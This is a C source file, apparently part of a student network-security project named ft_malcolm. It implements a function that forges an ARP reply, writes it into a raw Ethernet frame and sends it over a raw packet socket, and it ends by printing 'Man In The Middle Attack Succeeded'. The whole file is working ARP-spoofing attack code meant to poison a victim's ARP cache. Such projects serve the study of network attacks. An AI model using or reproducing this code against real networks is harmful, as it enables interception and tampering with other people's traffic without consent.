#include "../includes/ft_malcolm.h"

int arp_reply(char **av){
	int sock, bytes, frame_length;
	arp_hdr arphdr;
	struct sockaddr_ll device;
	unsigned char ether_frame[60];

	printf("Initialization of the ARP reply ...");
	sleep(1);
	fill_arphdr(&arphdr, av);
	fill_device(&device, arphdr.sender_mac);
	frame_length = 6 + 6 + 2 + 18 + 28; // 18 = PADDIND && 28 = ARP_HDRLEN
	ft_bzero(ether_frame, 60);
	memcpy(ether_frame, arphdr.target_mac, 6 * sizeof (uint8_t));
	memcpy(ether_frame + 6, arphdr.sender_mac, 6 * sizeof (uint8_t));
	ether_frame[12] = ETH_P_ARP / 256;
	ether_frame[13] = ETH_P_ARP % 256; // => ether_frame[12] = 08 / ether_frame[13] = 06 pour correspondre avec le ETH_P_ARP = 0x0806
	memcpy(ether_frame + 14, &arphdr, 28 * sizeof (uint8_t));
	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if(sock < 0){
		perror("socket() failed");
		return (-1);
	}
	bytes = sendto(sock, ether_frame, frame_length, 0, (struct sockaddr *)&device, sizeof(device));
	if (bytes <= 0){
		perror("sendto() failed");
		return (-1);
	}
	close(sock);
	display(ether_frame);
	printf("Man In The Middle Attack Succeeded\n");
	return (0);
}
